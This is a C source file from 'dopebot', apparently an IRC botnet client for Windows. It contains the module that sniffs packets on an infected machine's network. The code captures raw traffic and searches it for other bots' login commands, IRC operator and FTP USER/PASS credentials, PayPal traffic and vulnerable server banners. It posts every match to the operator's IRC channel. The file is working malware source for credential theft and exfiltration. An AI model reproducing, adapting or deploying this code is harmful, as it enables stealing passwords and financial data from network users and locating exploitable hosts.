/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SCANNER
//Holy Shit, A Packet Sniffer That Actually Works ;)
#include "bot.h"

//Defines....
#define BOTP 0
#define IRCP 1
#define FTPP 2
#define HTTPP 3
#define SSHP 4

//LOL, GLOBALS! No Comment...
BOOL bSniffing = FALSE;
HANDLE hThread = NULL;

//Packet Type
char *packetype[] = 
{
	"BOT",
	"IRC",
	"FTP",
	"HTTP",
	"SSH"
};

//Signatures
signs sig[] = 
{
	{":.login", BOTP},
	{":,login", BOTP},
	{":!login", BOTP},
	{":@login", BOTP},
	{":$login", BOTP},
	{":%login", BOTP},
	{":^login", BOTP},
	{":&login", BOTP},
	{":*login", BOTP},
	{":-login", BOTP},
	{":+login", BOTP},
	{":/login", BOTP},
	{":=login", BOTP},
	{":?login", BOTP},
	{":'login", BOTP},
	{":`login", BOTP},
	{":~login", BOTP},
	{": login", BOTP},
	{":.auth", BOTP},
	{":@auth", BOTP},
	{":$auth", BOTP},
	{":^auth", BOTP},
	{":.+auth", BOTP},
	{":'auth", BOTP},
	{":`auth", BOTP},
	{":~auth", BOTP},
	{":.id", BOTP},
	{": id", BOTP},
	{":.hashin", BOTP},
	{":.l", BOTP},
	{":!l", BOTP},
	{":$l", BOTP},
	{":.x", BOTP},
	{" CDKey ", BOTP},
	{"JOIN #", IRCP},
	{"OPER ", IRCP},
	{"oper ", IRCP},
	{"now an IRC Operator", IRCP},
	{"USER ", FTPP},
	{"PASS ", FTPP},
	{"FTP sniff", FTPP},
	{"paypal", HTTPP},
	{"PAYPAL", HTTPP},
	{"paypal.com", HTTPP},
	{"PAYPAL.COM", HTTPP},
//	{"Set-Cookie:", HTTPP},
	{"Serv-U FTP Server", SSHP},
	{"OpenSSL/0.9.6", SSHP},
	{"OpenSSH_2", SSHP},
	{NULL, 0}
};

//Packet Sniffer
DWORD WINAPI psniff(LPVOID param)
{
	char *p, szBuffer[IRCBUF], szInterface[2048], *szPacket, szRawData[65535];
	DWORD dwRet;
	int i, val = 1;
	IN_ADDR ia;
	IPHEADER *iphdr;
	sniffer sniff = *((sniffer *)param);
	SOCKET_ADDRESS_LIST *salist;
	SOCKET sock;
	struct sockaddr_in sin;
	TCPHEADER *tcphdr;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting to sniff packets, psniff()\n");
#endif	

//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) goto end;
		sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, 0, 0, WSA_FLAG_OVERLAPPED);
	if (sock == INVALID_SOCKET) goto end;
	if (WSAIoctl(sock, SIO_ADDRESS_LIST_QUERY, NULL, 0, szInterface, sizeof(szInterface), &dwRet, NULL, NULL) == SOCKET_ERROR) goto end;
		salist = (SOCKET_ADDRESS_LIST *)szInterface;
		sin.sin_family = AF_INET;
		sin.sin_port = 0;
//Address[0] Is First Dedicated Network Card, Beware If You Use WMware As It Adds Two Network Cards!!
		sin.sin_addr.s_addr = ((struct sockaddr_in *)salist->Address[0].lpSockaddr)->sin_addr.s_addr;
	if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) goto end;
	if (WSAIoctl(sock, SIO_RCVALL, &val, sizeof(val), NULL, 0, &dwRet, NULL, NULL) == SOCKET_ERROR) goto end;
	while(1)
	{
			memset(szRawData, 0, sizeof(szRawData));
			szPacket = (char *)szRawData;
		if (recv(sock, szPacket, sizeof(szRawData), 0) == SOCKET_ERROR) goto end;
			iphdr = (IPHEADER *)szPacket;
		if (iphdr->proto == 6)
		{
				szPacket += sizeof(*iphdr);
				tcphdr = (TCPHEADER *)szPacket;
				ia.S_un.S_addr = iphdr->sourceIP;
			if (tcphdr->th_flag == 24)
			{
					szPacket += sizeof(*tcphdr);
				if (strstr(szPacket, "[SNIFFER]") == NULL)
				{
					for (i = 0; sig[i].szText; i++)
					{
						if ((strstr(szPacket, sig[i].szText)) != NULL)
						{
								p = strtok(szPacket, "\r\n");
								sprintf(szBuffer, "[SNIFFER] %s packet from: %s:%d - %s.", packetype[sig[i].iPacketType], inet_ntoa(ia), ntohs(tcphdr->th_sport), p);
								printf("%s\n", szBuffer);
								irc_msg(sniff.bsock, sniff.szAction, (char *)snifferchannel, szBuffer);
								break;
						}
					}
				}
			}
		}
			Sleep(10);
	}
end:
		sprintf(szBuffer, "[SNIFFER] sniffing failed.");
		irc_msg(sniff.bsock, sniff.szAction, sniff.szChannel, szBuffer);
		closesocket(sock);
//		WSACleanup();
		ExitThread(0);
}

//Start / Stop Sniffer
void sniff(int iMode, SOCKET bsock, char *szAction, char *szChannel, bool bSilent)
{
	char szBuffer[IRCBUF];
	DWORD dwID;
	sniffer sniff;
		sprintf(szBuffer, "[SNIFFER] sniffing initialization failed.");
	if (is_os9x()) sprintf(szBuffer, "[SNIFFER] sniffing failed, incompatible os.");
	if (!is_osnt()) sprintf(szBuffer, "[SNIFFER] sniffing failed, incompatible os.");
	if (iMode == 1)
	{
		if (bSniffing) sprintf(szBuffer, "[SNIFFER] sniffer already running!");
		else
		{
				sniff.bsock = bsock;
				sprintf(sniff.szAction, szAction);
				sprintf(sniff.szChannel, szChannel);
				hThread = CreateThread(NULL, 0, &psniff, &sniff, 0, &dwID);
				bSniffing = TRUE;
				sprintf(szBuffer, "[SNIFFER] sniffer started.");
		}
	}
	else if (iMode == 2)
	{
		if (!bSniffing) sprintf(szBuffer, "[SNIFFER] sniffer not running!");
		else
		{
				TerminateThread(hThread, 0);
				CloseHandle(hThread);
				bSniffing = FALSE;
				sprintf(szBuffer, "[SNIFFER] sniffer stopped!");
		}
	}
	if (!bSilent) irc_msg(bsock, szAction, szChannel, szBuffer);
		return;
}
#endif
